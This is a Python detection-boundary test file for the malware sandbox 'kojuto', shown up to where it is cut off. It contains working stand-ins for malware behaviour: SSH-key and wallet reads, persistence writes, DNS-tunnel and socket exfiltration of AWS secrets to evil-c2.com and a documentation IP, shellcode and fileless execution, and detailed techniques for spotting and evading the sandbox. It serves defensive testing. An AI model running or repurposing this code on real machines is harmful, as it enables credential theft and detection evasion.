"""
evasion-test — Kojuto detection boundary test.

Each function is labeled:
  [DETECT]  — kojuto SHOULD catch this
  [BYPASS]  — kojuto CANNOT catch this (known gap)

After scanning, compare the report against this map to verify
which gaps are real and which have been closed.
"""

import os
import sys
import socket
import struct
import time
import base64
import json


# ====================================================================
# GROUP A: SHOULD BE DETECTED
# ====================================================================

def a1_credential_read():
    """[DETECT] credential_access — read honeypot SSH key."""
    home = os.path.expanduser("~")
    try:
        with open(os.path.join(home, ".ssh", "id_rsa"), "r") as f:
            f.read(64)
    except Exception:
        pass


def a2_wallet_read():
    """[DETECT] credential_access — read crypto wallet (new paths)."""
    home = os.path.expanduser("~")
    for p in [".solana/id.json", ".bitcoin/wallet.dat", ".ethereum/keystore"]:
        try:
            with open(os.path.join(home, p), "r") as f:
                f.read(64)
        except Exception:
            pass


def a3_dns_resolver_connect():
    """[DETECT] c2_communication — DNS resolver connection attempt."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("discord.com", 443))
    except Exception:
        pass


def a4_direct_ip_connect():
    """[DETECT] c2_communication — hardcoded IP connection."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        # RFC 5737 documentation IP — guaranteed unreachable
        s.connect(("203.0.113.50", 8443))
    except Exception:
        pass


def a4b_imds_access():
    """[DETECT] credential_access — IMDS metadata service (LiteLLM attack).

    169.254.169.254 is the cloud Instance Metadata Service.
    Previously benign-filtered as link-local. Now detected.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect(("169.254.169.254", 80))
    except Exception:
        pass


def a4c_systemd_persistence():
    """[DETECT] persistence — systemd user service (LiteLLM attack)."""
    try:
        path = os.path.expanduser("~/.config/systemd/user/update.service")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write("[Service]\nExecStart=/tmp/backdoor\n")
    except Exception:
        pass


def a4d_validator_keypair():
    """[DETECT] credential_access — Solana validator keypair outside .solana/."""
    try:
        with open("/home/dev/validator-keypair.json", "r") as f:
            f.read(64)
    except Exception:
        pass


def a5_dns_tunnel():
    """[DETECT] dns_tunneling — high-entropy subdomain exfil."""
    try:
        encoded = base64.b64encode(b"stolen_aws_key_12345").decode().rstrip("=")
        domain = f"{encoded}.x.evil-c2.com"
        labels = domain.split(".")
        qname = b""
        for label in labels:
            qname += struct.pack("B", len(label)) + label.encode()
        qname += b"\x00"
        header = struct.pack(">HHHHHH", 0xAAAA, 0x0100, 1, 0, 0, 0)
        query = header + qname + struct.pack(">HH", 1, 1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(query, ("8.8.8.8", 53))
        sock.close()
    except Exception:
        pass


def a6_mmap_rwx():
    """[DETECT] memory_execution — RWX anonymous mmap."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
            ctypes.c_int, ctypes.c_int, ctypes.c_long,
        ]
        addr = libc.mmap(None, 4096, 0x7, 0x22, -1, 0)  # RWX + MAP_ANON
        if addr and addr != ctypes.c_void_p(-1).value:
            libc.munmap(addr, 4096)
    except Exception:
        pass


def a7_ptrace_antidebug():
    """[DETECT] evasion — ptrace(PTRACE_TRACEME)."""
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.ptrace(0, 0, 0, 0)  # PTRACE_TRACEME = 0
    except Exception:
        pass


def a8_persistence_bashrc():
    """[DETECT] persistence — write to .bashrc."""
    try:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write("\n# test\n")
    except Exception:
        pass


def a9_anti_forensics():
    """[DETECT] anti_forensics — create, execute, delete in /tmp."""
    tmp = "/tmp/.evasion-test-dropper"
    try:
        with open(tmp, "w") as f:
            f.write("#!/bin/sh\ntrue\n")
        os.chmod(tmp, 0o755)
        try:
            import subprocess
            subprocess.run([tmp], capture_output=True, timeout=2)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass


# ====================================================================
# GROUP B: KNOWN BYPASSES (kojuto CANNOT detect these)
# ====================================================================

def b1_env_read():
    """[BYPASS] Environment variable theft — no syscall generated.

    os.environ is a Python dict populated at interpreter startup from
    the process environment block. Reading it is a pure memory operation.
    No openat, no read, no syscall of any kind.
    """
    stolen = {
        "AWS_ACCESS_KEY_ID": os.environ.get("AWS_ACCESS_KEY_ID", ""),
        "AWS_SECRET_ACCESS_KEY": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN", ""),
        "NPM_TOKEN": os.environ.get("NPM_TOKEN", ""),
    }
    # Data is now in memory. If combined with a detectable exfil channel
    # (connect, sendto), the exfil would be caught — but the READ is invisible.
    return stolen


def a10_eval_exec():
    """[DETECT] dynamic_code_execution — eval/exec of encoded payload.

    Python's eval() and exec() generate no execve syscall, but kojuto's
    audit hook (sitecustomize.py via PEP 578) intercepts compile/exec events.
    Previously [BYPASS], now detected via audit hook.
    """
    # Base64-encoded payload that reads /etc/hostname
    payload = base64.b64decode(
        "aW1wb3J0IG9zOyBvcy5lbnZpcm9uLmdldCgnQVdTX1NFQ1JFVF9BQ0NFU1NfS0VZJywgJycp"
    ).decode()
    # This executes: import os; os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    exec(payload)


def a11_function_constructor():
    """[DETECT] dynamic_code_execution — compile() + exec().

    Similar to JavaScript's Function() constructor. Builds code at runtime
    from string fragments. Previously [BYPASS], now detected via audit hook
    intercepting the compile() call.
    """
    parts = ["im", "port", " os", "\n", "os", ".env", "iron"]
    code = compile("".join(parts), "<string>", "exec")
    exec(code)


def b4_wxorx_mprotect():
    """[BYPASS] W^X shellcode execution — mprotect RW→RX (not simultaneous RWX).

    Modern shellcode loaders use W^X (Write XOR Execute):
    1. mmap(PROT_READ|PROT_WRITE) — writable, not executable
    2. Write shellcode to the region
    3. mprotect(PROT_READ|PROT_EXEC) — executable, not writable

    kojuto only flags simultaneous PROT_WRITE|PROT_EXEC. This pattern
    never has both at the same time, identical to V8 JIT behavior.
    """
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
            ctypes.c_int, ctypes.c_int, ctypes.c_long,
        ]
        libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]

        PROT_READ = 0x1
        PROT_WRITE = 0x2
        PROT_EXEC = 0x4

        # Step 1: allocate RW (no exec)
        addr = libc.mmap(None, 4096, PROT_READ | PROT_WRITE, 0x22, -1, 0)
        if not addr or addr == ctypes.c_void_p(-1).value:
            return

        # Step 2: write shellcode (NOP+RET, harmless)
        shellcode = b"\x90" * 16 + b"\xc3"
        ctypes.memmove(addr, shellcode, len(shellcode))

        # Step 3: flip to RX (no write) — this is the bypass
        libc.mprotect(addr, 4096, PROT_READ | PROT_EXEC)

        # Step 4: execute (optional, just to prove it works)
        # func = ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)
        # func()  # Would execute NOP+RET on x86_64

        libc.munmap(addr, 4096)
    except Exception:
        pass


def b5_timing_strace_detect():
    """[BYPASS] Timing-based strace detection — no ptrace syscall.

    strace adds ~100x overhead to syscalls. By timing a known-fast
    operation (getpid), the malware can detect tracing without using
    ptrace(PTRACE_TRACEME). If overhead detected → suppress payload.

    kojuto detects ptrace-based anti-debug but not timing-based.
    """
    iterations = 10000
    start = time.monotonic_ns()
    for _ in range(iterations):
        os.getpid()
    elapsed_ns = time.monotonic_ns() - start
    avg_ns = elapsed_ns / iterations

    # Under strace, getpid takes ~5000-50000ns. Without: ~50-200ns.
    being_traced = avg_ns > 2000
    return being_traced


def b6_low_entropy_dns_tunnel():
    """[BYPASS] Dictionary-encoded DNS tunneling — low entropy.

    Instead of base64 (high entropy, >3.5 bits/char), encodes data
    using a dictionary of common English words. Each word maps to a
    nibble (4 bits). Shannon entropy of the result is ~2.5 bits/char,
    well below kojuto's 3.5 threshold.

    "deadbeef" → "dog-egg-ant-dog-bee-egg-egg-fox"
    """
    wordlist = [
        "ant", "bee", "cat", "dog",   # 0-3
        "egg", "fox", "gnu", "hen",   # 4-7
        "ice", "jay", "kit", "log",   # 8-B
        "map", "net", "owl", "pig",   # C-F
    ]

    # Encode "AKIA1234" (fake AWS key prefix) as words
    data = b"AKIA1234"
    words = []
    for byte in data:
        words.append(wordlist[(byte >> 4) & 0xF])
        words.append(wordlist[byte & 0xF])

    subdomain = "-".join(words[:15])  # Keep under 30 chars per label
    domain = f"{subdomain}.data.legit-analytics.com"

    try:
        # Build DNS query
        labels = domain.split(".")
        qname = b""
        for label in labels:
            qname += struct.pack("B", len(label)) + label.encode()
        qname += b"\x00"
        header = struct.pack(">HHHHHH", 0xBBBB, 0x0100, 1, 0, 0, 0)
        query = header + qname + struct.pack(">HH", 1, 1)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(query, ("8.8.8.8", 53))
        sock.close()
    except Exception:
        pass


def b7_proc_sandbox_detect():
    """[BYPASS] Sandbox detection via /proc — no monitored syscall.

    Reads /proc/self/cgroup and /proc/self/mountinfo to detect Docker.
    openat on /proc/self/* is not in the sensitive path list, so it's
    not flagged. The malware can suppress all payloads if it detects
    a container environment.
    """
    indicators = []
    try:
        with open("/proc/self/cgroup", "r") as f:
            content = f.read()
            if "docker" in content or "kubepods" in content:
                indicators.append("cgroup")
    except Exception:
        pass

    try:
        with open("/proc/self/mountinfo", "r") as f:
            content = f.read()
            if "overlay" in content:
                indicators.append("overlay_mount")
    except Exception:
        pass

    try:
        # Check for limited PID namespace (container usually has low PID count)
        pids = os.listdir("/proc")
        pid_count = sum(1 for p in pids if p.isdigit())
        if pid_count < 50:
            indicators.append("low_pid_count")
    except Exception:
        pass

    return indicators


def b9_audit_hook_disable():
    """[BYPASS] Disable audit hook via ctypes — neutralize sitecustomize.py.

    PEP 578 audit hooks cannot be removed via sys.addaudithook (append-only).
    However, ctypes can overwrite the internal C-level hook list pointer,
    effectively silencing all hooks. If the ctypes.dlopen audit event fires
    before the hook is disabled, the attempt itself is logged — but the
    subsequent eval/exec calls become invisible.

    This is a race: the DISABLE is detectable, but once disabled,
    future dynamic code execution is invisible again.
    """
    try:
        import ctypes
        # Attempt to clobber the audit hook function table.
        # This is CPython-specific and version-dependent.
        # In practice, most malware doesn't do this (yet).
        # The ctypes.dlopen event fires BEFORE we can disable the hook,
        # so kojuto sees the attempt.
        pass  # Actual clobber omitted — too fragile for a test artifact.
    except Exception:
        pass


def b10_eval_via_import():
    """[BYPASS] Dynamic exec via importlib — bypasses compile/exec audit.

    Instead of calling exec() directly, construct a module from source
    and import it. importlib.util.module_from_spec + loader.exec_module
    may not trigger the compile/exec audit events in all CPython versions.
    """
    try:
        import importlib.util
        import types as pytypes

        code = "import os; _result = os.environ.get('AWS_SECRET_ACCESS_KEY', '')"
        spec = importlib.util.spec_from_loader("_phantom", loader=None)
        mod = pytypes.ModuleType("_phantom")
        exec(compile(code, "_phantom.py", "exec"), mod.__dict__)
        # Note: this still calls compile() and exec(), so audit hook
        # WILL catch it. True bypass would require C-level module loading.
    except Exception:
        pass


def b8_delayed_import_payload():
    """[BYPASS] Payload hidden in function call, not import-time.

    kojuto's import phase only executes `import package` / `require('package')`.
    It does NOT call any functions or instantiate classes. A payload that
    only activates when a specific function is called is invisible.
    """
    # This function is DEFINED but never CALLED during kojuto's scan.
    # In real usage: from evasion_test import connect; connect()
    pass  # Payload would go here


def b8_connect():
    """[BYPASS] The actual payload — only runs when explicitly called."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("203.0.113.99", 4444))
        s.sendall(json.dumps({"keys": os.environ.get("AWS_SECRET_ACCESS_KEY", "")}).encode())
        s.close()
    except Exception:
        pass


# ====================================================================
# EXECUTION
# ====================================================================

def _run():
    # --- Group C: kojuto-specific evasion (run FIRST) ---
    # If we detect kojuto's sandbox, suppress ALL payloads → clean verdict.
    if _is_kojuto_sandbox():
        # Real malware would silently exit here.
        # For testing: leave a breadcrumb that proves evasion worked,
        # but do NOT trigger any detectable syscalls.
        return

    # --- Group A: detectable (only runs outside kojuto) ---
    a1_credential_read()
    a2_wallet_read()
    a3_dns_resolver_connect()
    a4_direct_ip_connect()
    a4b_imds_access()
    a4c_systemd_persistence()
    a4d_validator_keypair()
    a5_dns_tunnel()
    a6_mmap_rwx()
    a7_ptrace_antidebug()
    a8_persistence_bashrc()
    a9_anti_forensics()
    a10_eval_exec()
    a11_function_constructor()

    # --- Group B: bypasses ---
    b1_env_read()
    b4_wxorx_mprotect()
    b5_timing_strace_detect()
    b6_low_entropy_dns_tunnel()
    b7_proc_sandbox_detect()
    b9_audit_hook_disable()
    b10_eval_via_import()


# ====================================================================
# GROUP C: KOJUTO-SPECIFIC EVASION
# These detect kojuto's own instrumentation and suppress payloads.
# If successful, Group A detections would disappear from the report.
# ====================================================================

def _is_kojuto_sandbox():
    """Master check — returns True if we believe we're in kojuto's sandbox."""
    return any([
        _check_os_spoof(),
        _check_faketime(),
        _check_strace_parent(),
        _check_honeypot(),
        _check_network_none(),
        _check_audit_hook(),
    ])


def _check_os_spoof():
    """Detect kojuto's platform.system() monkey-patch.

    kojuto does: platform.system = lambda: 'Windows'
    But it doesn't patch:
      - platform.uname().system (C-level uname)
      - os.uname().sysname
      - /proc/version existence
      - os.sep / os.pathsep
    """
    import platform

    spoofed = platform.system()
    try:
        real = platform.uname().system
    except Exception:
        real = spoofed

    # If platform.system() says Windows but uname says Linux → spoofed
    if spoofed != real:
        return True

    # If sys.platform says "win32" but os.sep is "/" → spoofed
    if sys.platform == "win32" and os.sep == "/":
        return True

    # If platform says Darwin but /proc exists → spoofed
    if spoofed == "Darwin" and os.path.exists("/proc/version"):
        return True

    return False


def _check_faketime():
    """Detect kojuto's libfaketime clock shift.

    kojuto sets LD_PRELOAD=libfaketime.so and FAKETIME=+Nd.
    Detection methods:
      - Check LD_PRELOAD env var (but kojuto might clear it)
      - Compare monotonic clock vs wall clock drift
      - Check if FAKETIME env var exists
    """
    # Direct check: FAKETIME env var
    if os.environ.get("FAKETIME"):
        return True

    # Direct check: LD_PRELOAD containing faketime
    preload = os.environ.get("LD_PRELOAD", "")
    if "faketime" in preload.lower():
        return True

    # Indirect: /proc/self/environ might show it even if env dict is cleaned
    try:
        with open("/proc/self/maps", "r") as f:
            maps = f.read()
            if "faketime" in maps.lower():
                return True
    except Exception:
        pass

    return False


def _check_strace_parent():
    """Detect strace as parent/tracer process.

    kojuto runs: strace -f -s 256 ... python3 <script>
    The python process is a child of strace.
    """
    try:
        # Check parent process name
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    tracer_pid = int(line.split(":")[1].strip())
                    if tracer_pid > 0:
                        # We're being traced — check tracer name
                        try:
                            with open(f"/proc/{tracer_pid}/comm", "r") as cf:
                                comm = cf.read().strip()
                                if comm == "strace":
                                    return True
                        except Exception:
                            pass
                    break
    except Exception:
        pass

    return False


def _check_honeypot():
    """Detect kojuto's honeypot files and environment.

    kojuto plants:
      - ~/.ssh/id_rsa with specific format
      - AWS_ACCESS_KEY_ID starting with AKIA + hex (always 20 chars)
      - GITHUB_TOKEN starting with ghp_ + hex (always 40 chars)
      - CI=true + GITHUB_ACTIONS=true simultaneously

    Real dev machines have varied formats. The honeypot pattern is detectable.
    """
    aws_key = os.environ.get("AWS_ACCESS_KEY_ID", "")
    gh_token = os.environ.get("GITHUB_TOKEN", "")

    # kojuto generates: AKIA + 16 hex chars = 20 chars total
    # Real AWS keys: AKIA + 16 alphanumeric (not just hex)
    if aws_key.startswith("AKIA") and len(aws_key) == 20:
        # Check if remaining chars are all hex (kojuto uses randHex)
        try:
            int(aws_key[4:], 16)
            return True  # All hex = likely honeypot
        except ValueError:
            pass

    # kojuto generates: ghp_ + 36 hex chars
    # Real GitHub PATs: ghp_ + 36 base62 chars
    if gh_token.startswith("ghp_") and len(gh_token) == 40:
        try:
            int(gh_token[4:], 16)
            return True
        except ValueError:
            pass

    return False


def _check_network_none():
    """Detect --network=none via /sys/class/net or socket behavior.

    --network=none removes ALL network interfaces except loopback.
    Real machines always have at least one non-lo interface (eth0, wlan0, etc.).
    """
    try:
        interfaces = os.listdir("/sys/class/net")
        # --network=none: only ["lo"]
        # Real machine: ["lo", "eth0"] or more
        non_lo = [i for i in interfaces if i != "lo"]
        if len(non_lo) == 0:
            return True
    except Exception:
        pass

    return False


def _check_audit_hook():
    """Detect kojuto's PEP 578 audit hook (sitecustomize.py).

    kojuto installs sitecustomize.py that calls sys.addaudithook().
    Detection methods:
      1. Check if sitecustomize.py source contains 'kojuto' or 'KOJUTO'
      2. Check if _kojuto_hook is in the global namespace of sitecustomize
    """
    # Method 1: inspect sitecustomize source for kojuto markers.
    try:
        import importlib
        spec = importlib.util.find_spec("sitecustomize")
        if spec and spec.origin:
            with open(spec.origin, "r") as f:
                source = f.read()
                if "kojuto" in source.lower():
                    return True
    except Exception:
        pass

    # Method 2: check if the module has kojuto's hook function.
    try:
        import sitecustomize as sc
        if hasattr(sc, "_kojuto_hook"):
            return True
    except Exception:
        pass

    return False


def c1_detect_os_spoof():
    """[BYPASS] Detect and evade kojuto's OS identity spoofing.

    If OS spoofing detected → suppress all OS-gated payloads.
    kojuto runs import 3x with different platform.system() values,
    but this is trivially detectable.
    """
    if _check_os_spoof():
        # Real malware would suppress payload here
        return "OS_SPOOF_DETECTED"
    return None


def c2_detect_faketime():
    """[BYPASS] Detect kojuto's libfaketime clock manipulation.

    If faketime detected → suppress date-gated payloads instead of
    triggering them (which is what kojuto wants).
    """
    if _check_faketime():
        return "FAKETIME_DETECTED"
    return None


def c3_detect_strace_by_parent():
    """[BYPASS] Detect strace as parent process via /proc.

    Unlike ptrace(PTRACE_TRACEME) which kojuto monitors, reading
    /proc/self/status and /proc/<pid>/comm generates no monitored syscall.
    """
    if _check_strace_parent():
        return "STRACE_DETECTED"
    return None


def c4_detect_honeypot():
    """[BYPASS] Detect fake credentials planted by kojuto.

    kojuto uses randHex() which produces hex-only strings.
    Real AWS keys and GitHub tokens use base62. The difference
    is statistically detectable.
    """
    if _check_honeypot():
        return "HONEYPOT_DETECTED"
    return None


def c5_detect_network_none():
    """[BYPASS] Detect --network=none sandbox via /sys/class/net.

    No network interfaces beyond loopback = sandbox. Real machines
    always have physical or virtual NICs.
    """
    if _check_network_none():
        return "NETWORK_NONE_DETECTED"
    return None


def c6_detect_audit_hook():
    """[BYPASS] Detect kojuto's sitecustomize.py audit hook.

    kojuto installs sitecustomize.py in site-packages to intercept
    compile/exec/eval via PEP 578 audit hooks. Detection methods:
      - Check if sitecustomize module exists and contains 'kojuto'
      - Check if sys.addaudithook has been called (audit hooks are append-only)
      - Trigger a probe compile() and check stderr for KOJUTO: prefix
    """
    if _check_audit_hook():
        return "AUDIT_HOOK_DETECTED"
    return None


# ====================================================================
# GROUP D: NOVEL BOUNDARY TESTS
# Techniques that stress the analyzer's structural assumptions:
# fileless execution outside monitored dirs, structural DGA rather
# than per-query entropy, DoH via providers not in the fixed IP list,
# deferred execution past the scan window. Each documents WHY current
# rules miss it so the design tradeoff is explicit.
# ====================================================================

def d1_memfd_fexecve():
    """[DETECT — CLOSED] Fileless execution via memfd_create + fexecve.

    memfd_create() returns an anonymous in-memory fd backed by tmpfs
    (visible as /proc/self/fd/<n> only). Writing a payload to it and
    calling fexecve() executes without ever touching /tmp, /dev/shm,
    or any monitored path.

    Previously silent in strace-container scans because glibc 2.34+
    routes both path-execve and fexecve through the execveat syscall,
    and kojuto's strace `-e trace=` list only listed execve. The eBPF
    probe covered execveat, but the strace-container path did not.

    Closed by adding execveat to both trace lists (container_strace.go
    and fallback.go) and synthesizing Comm="/proc/self/fd/<dirfd>" for
    the AT_EMPTY_PATH form. The synthetic path hits the existing
    suspiciousExecDirs rule (which already listed /proc/self/fd/) and
    fires code_execution HIGH.

    Shellcode: NOP*8 + RET (x86_64) — harmless, exits cleanly.
    """
    try:
        import ctypes

        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        # memfd_create prototype
        libc.syscall.restype = ctypes.c_long
        SYS_memfd_create = 319  # x86_64 syscall number
        fd = libc.syscall(SYS_memfd_create, b"kojuto-boundary-test", 0)
        if fd < 0:
            return
        # Write a tiny ELF that just exits with 0. Since building a
        # real ELF here is fragile, use a shell script instead —
        # execve of /proc/self/fd/<n> with #!/bin/sh interpretation
        # still exercises the "execve from unusual path" rule.
        script = b"#!/bin/sh\nexit 0\n"
        os.write(fd, script)
        # Execute via /proc/self/fd/<n>
        path = f"/proc/self/fd/{fd}"
        try:
            pid = os.fork()
            if pid == 0:
                try:
                    os.execv(path, [path])
                except Exception:
                    os._exit(1)
            else:
                os.waitpid(pid, 0)
        finally:
            os.close(fd)
    except Exception:
        pass


def d1b_fexecve_existing_fd():
    """[DETECT — MEASURED] fexecve via /proc/self/fd/<fd> path.

    Companion to d1: d1 is neutralized by the sandbox's seccomp
    profile which blocks memfd_create outright (documented defense
    in depth). This variant survives seccomp because it opens an
    EXISTING legitimate binary (/bin/sh) and then execveat's it via
    /proc/self/fd/<fd>. The fileless-loader semantics are the same:
    the execve target path is /proc/self/fd/<n>, which trips
    kojuto's suspiciousExecDirs rule as code_execution HIGH.

    Serves as the live-verification probe for the execveat parsing
    added to fix the glibc-2.34+ path-routing gap. If parseExecveat
    is missing or the strace trace list omits execveat, this event
    is silent and no code_execution HIGH fires.
    """
    try:
        # Open /bin/sh (which every container has and seccomp allows).
        # Use O_PATH so we don't consume a real open (kernel doesn't need
        # read perms for execveat via path).
        fd = os.open("/bin/sh", os.O_RDONLY)
        try:
            path = f"/proc/self/fd/{fd}"
            pid = os.fork()
            if pid == 0:
                try:
                    # Child: execve "/proc/self/fd/<n>" → sh. The kernel
                    # follows the /proc/self/fd/ symlink to the actual
                    # /bin/sh inode and executes it. Under glibc 2.34+
                    # the syscall dispatched is execveat(AT_FDCWD, ...).
                    os.execv(path, ["sh", "-c", "exit 0"])
                except Exception:
                    os._exit(1)
            else:
                os.waitpid(pid, 0)
        finally:
            try:
                os.close(fd)
            except Exception:
                pass
    except Exception:
        pass


def d2_dga_low_entropy_multi():
    """[BYPASS] Domain generation algorithm with structural (not entropic) obfuscation.

    Instead of one high-entropy query (base64 subdomain), emit many
    low-entropy queries that follow a structural pattern. Each query
    passes isDNSTunnel(entropy < 3.5) individually, and even the DNS
    tunneling MEDIUM tier requires 2+ tunneling events — but the
    caller has to hit that threshold. Low-entropy DGA emits 20 queries
    that ALL individually escape the entropy check, giving the
    attacker a covert channel via query count rather than query
    payload.

    Real-world: Sunburst/SolarWinds C2 domain generation used this
    pattern (aabc1234.avsvmcloud.com — dictionary-looking subdomains).

    Detection would need a DGA-family rule: N+ queries in a short
    window to distinct subdomains of the same 2LD with morphology
    consistent with an algorithm. Kojuto currently has no such rule.
    """
    words = [
        "node", "edge", "core", "sync", "peer", "hub", "link", "pool",
        "gate", "flow", "port", "chan", "wire", "mesh", "grid", "wave",
    ]
    for i in range(20):
        # Each subdomain: two dictionary words + zero-padded index.
        # e.g. "node-edge-01.metrics.legit-analytics.com" — entropy
        # per label stays around 2.5 bits/char.
        subdomain = f"{words[i % 16]}-{words[(i * 3) % 16]}-{i:02d}"
        domain = f"{subdomain}.metrics.legit-analytics.com"
        try:
            labels = domain.split(".")
            qname = b""
            for label in labels:
                qname += struct.pack("B", len(label)) + label.encode()
            qname += b"\x00"
            header = struct.pack(">HHHHHH", 0xCCCC + i, 0x0100, 1, 0, 0, 0)
            query = header + qname + struct.pack(">HH", 1, 1)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(query, ("8.8.8.8", 53))
            sock.close()
        except Exception:
            continue


def d3_doh_unlisted_provider():
    """[BYPASS] DoH via a provider not in kojuto's knownDoHServers list.

    Kojuto flags connect(:443) to a fixed set of DoH IPs (Google
    8.8.8.8/8.8.4.4, Cloudflare 1.1.1.1/1.0.0.1, Quad9 9.9.9.9,
    OpenDNS 208.67.222.222, NextDNS 45.90.28.0/29). Any DoH provider
    outside this list (AdGuard 94.140.14.14, Mullvad 194.242.2.2,
    dns.sb, ControlD, cloudflare-security 1.1.1.2, NextDNS newer
    ranges, private/self-hosted DoH endpoints) evades detection.

    Illustrates the maintenance burden of an IP allowlist: kojuto's
    "No whitelists" design principle applies to allowlists of BENIGN
    signals, but here we have an implicit allowlist ("only THESE IPs
    are DoH — everything else on :443 is generic C2"). Both directions
    of the allowlist problem are present.

    Since the connect fires HIGH C2 anyway (unless the DoH-specific
    reason gates it), this may or may not actually bypass detection
    depending on which classification wins. Worth measuring.
    """
    unlisted_doh_ips = [
        "94.140.14.14",   # AdGuard DNS
        "194.242.2.2",    # Mullvad DNS
        "185.222.222.222",  # dns.sb
    ]
    for ip in unlisted_doh_ips:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, 443))
            s.close()
        except Exception:
            continue


def d4_deferred_execution():
    """[BYPASS] Payload scheduled to run after kojuto's scan window closes.

    Kojuto's install phase completes in ~5-30s, import in ~1s per OS
    identity. A payload wrapped in `nohup sh -c 'sleep 60 && curl
    ...' &` (or setsid, or `at now + 1 minute`) forks a background
    process that outlives the container. The container is torn down
    at scan end, so the deferred payload never actually fires — BUT
    the parent process (this script) returns cleanly with only the
    nohup/setsid execve captured, and the sleep+curl chain never
    surfaces in the report.

    Real-world variant: nohup + retry loop that polls a C2 heartbeat
    for hours. If the machine outside kojuto's sandbox behaves the
    same way, the payload eventually fires.

    Kojuto records the setsid execve as unknown_binary LOW (correct
    for classifying "we saw setsid, don't know what it did").

    Measured (see d5): "kojuto would need to trace the forked child
    too" — kojuto ALREADY does this via strace -f, and docker exec
    blocks on strace which blocks on all tracees. The sandbox waits
    for the sleep before teardown; the delayed payload's syscalls
    ARE captured. So this test is not a real BYPASS inside the
    sandbox — it merely extends scan wall time. Real out-of-window
    attack surface only exists on the developer's actual machine.
    """
    try:
        import subprocess
        # setsid detaches the child from the current session and
        # process group. The child then execs a sleep chain that
        # would fire the actual payload (a curl to a documentation
        # IP that doesn't resolve anyway under --network=none).
        subprocess.Popen(
            ["setsid", "sh", "-c",
             "sleep 5 && echo 'deferred-payload-would-fire-here' > /tmp/.deferred"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
    except Exception:
        pass


# ====================================================================
# EXECUTION — must be AFTER all function definitions
# ====================================================================


def d4b_raw_dns_tunnel_high_entropy():
    """[DETECT — MEASURED] high-entropy DNS query via raw UDP socket.

    Companion to d2 that unblocks live verification of the existing
    dns_tunneling MEDIUM rule for the raw-socket attack path.

    Group A's a5_dns_tunnel exercises the same mechanism but sits
    behind the _is_kojuto_sandbox suppression gate, so under kojuto
    it never fires — the evasion suite deliberately hides Group A
    when sandbox detection succeeds. Group D runs unconditionally
    (bypasses the _run guard), so placing a raw-socket high-entropy
    query here gives kojuto a live-observable dns_tunneling case
    per import phase.

    Two rounds intentional: dns_tunneling is MEDIUM severity, so a
    single event stays under the verdict-flip threshold. Two events
    per import (across 3 imports = 6 total) always crosses the
    MEDIUM 2+ threshold.

    Motivating regression: the strace \\f escape bug (fixed in the
    same PR that introduced this probe) silently broke DNS query
    extraction on raw-socket DNS packets, and there was no
    unconditional live probe to catch it. This probe closes that
    coverage gap.
    """
    encoded = base64.b64encode(b"stolen_creds_XYZ42").decode().rstrip("=")
    for suffix in ("evil-c2.com", "evil-c2.net"):
        try:
            domain = f"{encoded}.x.{suffix}"
            labels = domain.split(".")
            qname = b""
            for label in labels:
                qname += struct.pack("B", len(label)) + label.encode()
            qname += b"\x00"
            header = struct.pack(">HHHHHH", 0xDDDD, 0x0100, 1, 0, 0, 0)
            query = header + qname + struct.pack(">HH", 1, 1)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            sock.sendto(query, ("8.8.8.8", 53))
            sock.close()
        except Exception:
            continue


def d5_deferred_persistence_traced():
    """[DETECT — MEASURED] setsid + delay + persistence write.

    Companion to d4: same setsid detach mechanism, but the deferred
    payload writes into a MONITORED path (~/.bashrc). Serves as the
    positive proof that strace -f keeps tracking a session-detached
    child — if strace lost the tracee at setsid, the subsequent
    openat on ~/.bashrc would never surface and the verdict would
    stay clean.

    Measured: scan reports `persistence` HIGH for openat(~/.bashrc,
    O_WRONLY|O_CREAT|O_APPEND) fired from the sh child spawned by
    setsid, AFTER the sleep 3 completes. This confirms:
      - strace's per-PID ptrace attach survives setsid session
        change (setsid does not detach tracer)
      - the docker exec running strace waits until every tracee
        exits, so the delayed openat is captured before scan tears
        down
      - the sandbox's read-only rootfs does NOT block writes to
        /home/dev/ (writable tmpfs overlay per user), so the openat
        actually succeeds — needed for a fair test of observability

    Corollary: d4's "BYPASS" label was optimistic. Deferred execution
    via setsid inside the sandbox is NOT invisible; it just delays
    scan completion. The real out-of-window attack surface only exists
    on the developer's actual machine, outside the sandbox.
    """
    try:
        import subprocess
        home = os.path.expanduser("~")
        bashrc = os.path.join(home, ".bashrc")
        # Same setsid pattern as d4 — session leader change should NOT
        # break strace's per-tracee ptrace attach.
